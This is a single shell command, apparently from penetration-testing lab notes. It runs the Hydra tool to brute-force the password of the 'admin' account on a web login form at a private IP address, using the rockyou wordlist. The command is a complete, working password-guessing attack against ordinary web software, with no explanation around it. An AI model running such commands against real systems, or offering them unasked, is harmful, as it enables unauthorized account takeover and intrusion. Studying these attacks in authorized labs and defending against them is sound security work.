hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.31 http-post-form "/l
ogin-off.asp:txtLoginID=^USER^&txtPassword=^PASS^&cmdSubmit=Login:ACCESS DENIED" -V
